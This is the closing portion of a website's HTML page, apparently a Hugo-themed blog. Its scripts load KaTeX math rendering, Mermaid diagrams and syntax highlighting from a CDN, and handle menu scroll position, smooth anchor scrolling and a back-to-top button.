<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js"
  integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"
  onload="renderMathInElement(document.body, { delimiters: [{ left: '$$', right: '$$', display: true }, { left: '\\[', right: '\\]', display: true }, { left: '$', right: '$', display: false }, { left: '\\(', right: '\\)', display: false }]})"></script>

<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
<script>
mermaid.initialize({
    startOnLoad: true,
    htmlLabels: true,
    securityLevel: "loose",
    theme: 'base',
    themeVariables: {
        background: '#22222c',
        primaryColor: '#33333c',
        primaryTextColor: '#ffe4e1',
    }
});
</script>



<script defer src="/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
    onload="hljs.initHighlightingOnLoad();"></script>
<script>
    window.onload = function () {
        if (localStorage.getItem("menu-scroll-position")) {
            document.getElementById('menu').scrollLeft = localStorage.getItem("menu-scroll-position");
        }
    }
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

    function menu_on_scroll() {
        localStorage.setItem("menu-scroll-position", document.getElementById('menu').scrollLeft);
    }

</script>

</body>

</html>
